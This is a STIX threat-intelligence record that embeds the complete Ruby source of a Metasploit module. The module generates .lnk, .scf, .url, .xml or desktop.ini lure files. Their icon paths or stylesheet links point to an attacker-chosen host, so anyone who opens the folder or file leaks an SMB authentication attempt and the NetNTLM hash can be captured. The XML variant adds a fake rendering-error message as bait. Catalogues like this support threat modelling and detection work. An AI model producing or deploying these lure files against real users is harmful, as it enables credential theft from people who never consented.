{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93cceb4e-a0a8-4096-9118-4e40b3d7609e",
    "created": "2024-08-14T16:21:47.861766Z",
    "modified": "2024-08-14T16:21:47.861771Z",
    "name": "Windows SMB Multi Dropper",
    "description": " This module dependent on the given filename extension creates either a .lnk, .scf, .url, .xml, or desktop.ini file which includes a reference to the specified remote host, causing SMB connections to be initiated from any user that views the file.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/fileformat/multidrop.rb",
            "external_id": "multidrop.rb"
        },
        {
            "source_name": "reference",
            "url": "https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018"
        },
        {
            "source_name": "reference",
            "url": "https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/"
        },
        {
            "source_name": "reference",
            "url": "https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super( update_info( info,\n        'Name'          => 'Windows SMB Multi Dropper',\n        'Description'   => %q{\n          This module dependent on the given filename extension creates either\n          a .lnk, .scf, .url, .xml, or desktop.ini file which includes a reference\n          to the specified remote host, causing SMB connections to be initiated\n          from any user that views the file.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        =>\n            [\n              'Richard Davy - secureyourit.co.uk',  #Module written by Richard Davy\n              'Lnk Creation Code by Mubix',         #Lnk Creation Code written by Mubix\n              'asoto-r7'                            #Word XML creation code\n            ],\n        'Platform'      => [ 'win' ],\n        'References'    =>\n        [\n          ['URL', 'https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018'],\n          ['URL', 'https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/'],\n          ['URL', 'https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/'],\n        ]\n\n      ))\n    register_options(\n      [\n        OptAddress.new(\"LHOST\", [ true, \"Host listening for incoming SMB/WebDAV traffic\", nil]),\n        OptString.new(\"FILENAME\", [ true, \"Filename - supports *.lnk, *.scf, *.url, *.xml, desktop.ini\", \"word.lnk\"]),\n      ])\n  end\n\n  def run\n    if datastore['FILENAME'].chars.last(3).join==\"lnk\"\n        createlnk\n    elsif datastore['FILENAME'].chars.last(3).join==\"scf\"\n        createscf\n    elsif datastore['FILENAME']==\"desktop.ini\"\n        create_desktopini\n    elsif datastore['FILENAME'].chars.last(3).join==\"url\"\n        create_url\n    elsif datastore['FILENAME'].chars.last(3).join==\"xml\"\n        create_xml\n    else\n        fail_with(Failure::BadConfig,\"Invalid FILENAME option\")\n    end\n  end\n\n  def createlnk\n    #Code below taken from module droplnk.rb written by Mubix\n    lnk = \"\"\n    lnk << \"\\x4c\\x00\\x00\\x00\"                  #Header size\n    lnk << \"\\x01\\x14\\x02\\x00\\x00\\x00\\x00\\x00\"  #Link CLSID\n    lnk << \"\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\"\n    lnk << \"\\xdb\\x00\\x00\\x00\"                  #Link flags\n    lnk << \"\\x20\\x00\\x00\\x00\"                  #File attributes\n    lnk << \"\\x30\\xcd\\x9a\\x97\\x40\\xae\\xcc\\x01\"  #Creation time\n    lnk << \"\\x30\\xcd\\x9a\\x97\\x40\\xae\\xcc\\x01\"  #Access time\n    lnk << \"\\x30\\xcd\\x9a\\x97\\x40\\xae\\xcc\\x01\"  #Write time\n    lnk << \"\\x00\\x00\\x00\\x00\"                  #File size\n    lnk << \"\\x00\\x00\\x00\\x00\"                  #Icon index\n    lnk << \"\\x01\\x00\\x00\\x00\"                  #Show command\n    lnk << \"\\x00\\x00\"                          #Hotkey\n    lnk << \"\\x00\\x00\"                          #Reserved\n    lnk << \"\\x00\\x00\\x00\\x00\"                  #Reserved\n    lnk << \"\\x00\\x00\\x00\\x00\"                  #Reserved\n    lnk << \"\\x7b\\x00\"                          #IDListSize\n    #sIDList\n    lnk << \"\\x14\\x00\\x1f\\x50\\xe0\\x4f\\xd0\\x20\"\n    lnk << \"\\xea\\x3a\\x69\\x10\\xa2\\xd8\\x08\\x00\"\n    lnk << \"\\x2b\\x30\\x30\\x9d\\x19\\x00\\x2f\"\n    lnk << \"C:\\\\\"\n    lnk << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    lnk << \"\\x00\\x00\\x00\\x4c\\x00\\x32\\x00\\x00\\x00\\x00\\x00\\x7d\\x3f\\x5b\\x15\\x20\"\n    lnk << \"\\x00\"\n    lnk << \"AUTOEXEC.BAT\"\n    lnk << \"\\x00\\x00\\x30\\x00\\x03\\x00\\x04\\x00\\xef\\xbe\\x7d\\x3f\\x5b\\x15\\x7d\\x3f\"\n    lnk << \"\\x5b\\x15\\x14\\x00\\x00\\x00\"\n    lnk << Rex::Text.to_unicode(\"AUTOEXEC.BAT\")\n    lnk << \"\\x00\\x00\\x1c\\x00\\x00\\x00\"\n    #sLinkInfo\n    lnk << \"\\x3e\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x01\\x00\"\n    lnk << \"\\x00\\x00\\x1c\\x00\\x00\\x00\\x2d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x3d\\x00\"\n    lnk << \"\\x00\\x00\\x11\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x3e\\x77\\xbf\\xbc\\x10\\x00\"\n    lnk << \"\\x00\\x00\\x00\"\n    lnk << \"C:\\\\AUTOEXEC.BAT\"\n    lnk << \"\\x00\\x00\\x0e\\x00\"\n    #RELATIVE_PATH\n    lnk << Rex::Text.to_unicode(\".\\\\AUTOEXEC.BAT\")\n    lnk << \"\\x03\\x00\"\n    #WORKING_DIR\n    lnk << Rex::Text.to_unicode(\"C:\\\\\")\n    #ICON LOCATION\n    lnk << \"\\x1c\\x00\"\n    lnk << Rex::Text.to_unicode(\"\\\\\\\\#{datastore['LHOST']}\\\\icon.ico\")\n    lnk << \"\\x00\\x00\\x03\\x00\\x00\\xa0\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    lnk << \"computer\"\n    lnk << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x26\\x4e\\x06\\x19\\xf2\\xa9\\x31\\x40\\x91\\xf0\"\n    lnk << \"\\xab\\x9f\\xb6\\xb1\\x6c\\x84\\x22\\x03\\x57\\x01\\x5e\\x1d\\xe1\\x11\\xb9\\x48\"\n    lnk << \"\\x08\\x00\\x27\\x6f\\xe3\\x1f\\x26\\x4e\\x06\\x19\\xf2\\xa9\\x31\\x40\\x91\\xf0\"\n    lnk << \"\\xab\\x9f\\xb6\\xb1\\x6c\\x84\\x22\\x03\\x57\\x01\\x5e\\x1d\\xe1\\x11\\xb9\\x48\"\n    lnk << \"\\x08\\x00\\x27\\x6f\\xe3\\x1f\\x00\\x00\\x00\\x00\"\n\n    file_create(lnk)\n  end\n\n  def createscf\n    scf=\"\"\n    scf << \"[Shell]\\n\"\n    scf << \"Command=2\\n\"\n    scf << \"IconFile=\\\\\\\\#{datastore['LHOST']}\\\\test.ico\\n\"\n    scf << \"[Taskbar]\\n\"\n    scf << \"Command=ToggleDesktop\"\n\n    file_create(scf)\n  end\n\n  def create_desktopini\n    ini=\"\"\n    ini << \"[.ShellClassInfo]\\n\"\n    ini << \"IconFile=\\\\\\\\#{datastore['LHOST']}\\\\icon.ico\\n\"\n    ini << \"IconIndex=1337\"\n\n    file_create(ini)\n  end\n\n  def create_url\n    url=\"\"\n    url << \"[InternetShortcut]\\n\"\n    url << \"URL=file://#{datastore['LHOST']}/url.html\\n\"\n    url << \"IconFile=\\\\\\\\#{datastore['LHOST']}\\\\icon.ico\\n\"\n\n    file_create(url)\n  end\n\n  def create_xml\n    xml=\"\"\n    xml << \"<?xml version='1.0' encoding='utf-8' ?>\"\n    xml << \"<?mso-application progid='Word.Document'?>\"\n    xml << \"<?xml-stylesheet type='text/xsl' href='file://#{datastore['LHOST']}/share/word.xsl'?>\"\n    xml << \"<Text>\"\n    xml << \" FATAL ERROR: The document failed to render properly.\"\n    xml << \"</Text>\"\n\n    file_create(xml)\n  end\n\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}